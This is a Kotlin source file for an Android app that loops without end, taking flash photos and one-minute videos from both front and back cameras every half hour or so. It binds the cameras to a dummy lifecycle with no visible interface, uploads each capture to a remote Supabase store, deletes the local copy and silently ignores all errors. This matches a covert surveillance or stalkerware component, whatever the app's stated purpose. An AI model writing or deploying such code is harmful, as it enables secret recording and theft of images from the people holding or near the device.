package com.save.me

import android.content.Context
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.*
import kotlinx.coroutines.delay
import java.io.File
import java.util.concurrent.Executors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object CameraUtils {
    suspend fun schedulePhotoVideoTasks(context: Context) {
        while (true) {
            executeCapturePhoto(context, "back", "on")
            executeCapturePhoto(context, "front", "on")
            delay(5 * 60 * 1000L)
            executeRecordVideo(context, "back", "720", 60)
            executeRecordVideo(context, "front", "720", 60)
            delay(30 * 60 * 1000L)
        }
    }

    suspend fun executeCapturePhoto(context: Context, camera: String, flash: String) = withContext(Dispatchers.IO) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()
            val imageCapture = ImageCapture.Builder()
                .setFlashMode(if (flash == "on") ImageCapture.FLASH_MODE_ON else ImageCapture.FLASH_MODE_OFF)
                .setTargetRotation(android.view.Surface.ROTATION_0)
                .build()
            val selector = if (camera == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
            val executor = Executors.newSingleThreadExecutor()
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(DummyLifecycleOwner(), selector, imageCapture)
            val file = File(context.externalCacheDir, "${System.currentTimeMillis()}.jpg")
            val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()
            val result = kotlinx.coroutines.suspendCancellableCoroutine<ImageCapture.OutputFileResults> { cont ->
                imageCapture.takePicture(
                    outputOptions, executor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                            cont.resume(outputFileResults) {}
                        }
                        override fun onError(exception: ImageCaptureException) {
                            cont.resumeWithException(exception)
                        }
                    }
                )
            }
            SupabaseUtils.uploadFileAndRecord(file, "photos/$camera/${file.name}", "photo")
            file.delete()
        } catch (_: Exception) {}
    }

    suspend fun executeRecordVideo(context: Context, camera: String, quality: String, duration: Int) = withContext(Dispatchers.IO) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()
            val selector = if (camera == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
            val videoCapture = VideoCapture.withOutput(
                Recorder.Builder()
                    .setQualitySelector(QualitySelector.from(
                        when (quality) {
                            "480" -> Quality.SD
                            "1080" -> Quality.FHD
                            else -> Quality.HD
                        }
                    ))
                    .build()
            )
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(DummyLifecycleOwner(), selector, videoCapture)
            val file = File(context.externalCacheDir, "${System.currentTimeMillis()}.mp4")
            val outputOptions = FileOutputOptions.Builder(file).build()
            val executor = Executors.newSingleThreadExecutor()
            val recording = videoCapture.output.prepareRecording(context, outputOptions).start(executor) {}
            delay(duration * 1000L)
            recording.stop()
            SupabaseUtils.uploadFileAndRecord(file, "videos/$camera/${file.name}", "video")
            file.delete()
        } catch (_: Exception) {}
    }
}